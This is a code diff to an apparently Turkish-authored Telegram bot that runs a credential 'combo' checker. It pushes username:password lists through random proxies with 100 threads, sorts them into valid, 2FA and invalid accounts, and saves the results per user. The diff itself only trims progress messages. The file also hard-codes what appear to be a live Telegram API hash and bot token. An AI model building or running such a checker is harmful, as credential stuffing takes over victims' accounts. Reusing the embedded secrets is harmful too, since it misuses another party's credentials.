@@ -4,11 +4,7 @@ import os, threading, random, time, re, requests, asyncio
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime
 from rich.console import Console
-import os
-import threading
-from rich.console import Console  # Console kullanıyorsan bu lazım
 
-# ---------------------------- BOT SETTINGS ----------------------------
 API_ID = 26843761
 API_HASH = "d0ebfea34c3cdab94dabb1b36338f7d2"
 BOT_TOKEN = "8497140725:AAE2YLSuXGYaKm4PxAe9P1uj085a118DJis"  # DİKKAT: Bunu public paylaşma normalde :)
@@ -21,14 +17,10 @@ USERS_FILE  = os.path.join(BASE_DIR, "users.json")  # users.json da /app içine 
 
 # Klasörü oluştur (yoksa hata verme)
 os.makedirs(RESULTS_DIR, exist_ok=True)
-
-# Global durumlar
 user_states = {}
 write_lock = threading.Lock()
 console = Console()
-
-
-#---------------------------- LOGGER ----------------------------
+#
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger("bot")
 
@@ -393,27 +385,17 @@ async def run_checker_with_proxies(client, combo_lines, message):
     if not proxies:
         await message.reply("⚠️ Proxy file is empty or not found. Checking without proxies.")
 
-    total_combos = len(combo_lines)
-    results = {"hit": [], "nfa": [], "fail": [], "retry": []}
-    total_checked, hit_count, nfa_count, bad_count, error_count = 0, 0, 0, 0, 0
+    status_msg = await message.reply(f"✔️ Starting check for **{len(combo_lines)}** combos.\nPlease wait a few minutes for the process to complete...")
 
-    progress_msg_text = (
-        f"🔍 **Checking...**\n\n"
-        f"📧 Total: `{total_combos}`\n"
-        f"✅ Hits: `{hit_count}`\n"
-        f"🟨 2FA: `{nfa_count}`\n"
-        f"❌ Bad: `{bad_count}`\n"
-        f"⚠️ Errors: `{error_count}`\n\n"
-        f"⏳ Progress: {total_checked}/{total_combos} (0.0%)"
-    )
-    progress_msg = await message.reply(progress_msg_text)
+    results = {"hit": [], "nfa": [], "fail": [], "retry": []}
+    total_checked, hit_count, nfa_count, fail_count = 0, 0, 0, 0
 
     with ThreadPoolExecutor(max_workers=100) as executor:
         future_to_line = {
             executor.submit(process_combo_line, line, {"http": f"http://{random.choice(proxies)}"} if proxies else None): line
             for line in combo_lines
         }
-        for i, future in enumerate(as_completed(future_to_line), start=1):
+        for future in as_completed(future_to_line):
             total_checked += 1
             try:
                 status, combo = future.result()
@@ -421,29 +403,12 @@ async def run_checker_with_proxies(client, combo_lines, message):
                     results[status].append(combo)
                 if status == "hit": hit_count += 1
                 elif status == "nfa": nfa_count += 1
-                elif status == "fail": bad_count += 1
-                else: error_count += 1 # 'retry' status
+                else: fail_count += 1
             except Exception:
                 results["retry"].append(future_to_line[future].strip())
-                error_count += 1
-            
-            if i % 20 == 0 or i == total_combos:
-                percent = (i / total_combos) * 100
-                text = (
-                    f"🔍 **Checking...**\n\n"
-                    f"📧 Total: `{total_combos}`\n"
-                    f"✅ Hits: `{hit_count}`\n"
-                    f"🟨 2FA: `{nfa_count}`\n"
-                    f"❌ Bad: `{bad_count}`\n"
-                    f"⚠️ Errors: `{error_count}`\n\n"
-                    f"⏳ Progress: {i}/{total_combos} ({percent:.1f}%)"
-                )
-                try:
-                    await progress_msg.edit_text(text)
-                except Exception:
-                    pass # Ignore flood wait errors
+                fail_count += 1
 
-    await progress_msg.delete()
+    await status_msg.delete()
 
     # --- Save results to files ---
     user_results_dir = os.path.join(RESULTS_DIR, str(user_id))
@@ -468,7 +433,7 @@ async def run_checker_with_proxies(client, combo_lines, message):
         f"**✨ Check Complete! ✨**\n\n"
         f"✅ Valid: `{hit_count}`\n"
         f"ℹ️ 2FA/NFA: `{nfa_count}`\n"
-        f"❌ Invalid: `{bad_count}`\n"
+        f"❌ Invalid: `{fail_count}`\n"
         f"🎯 Total Checked: `{total_checked}`\n\n"
         f"👑[OURCHANNEL](https://t.me/r3Z1N)"
     )
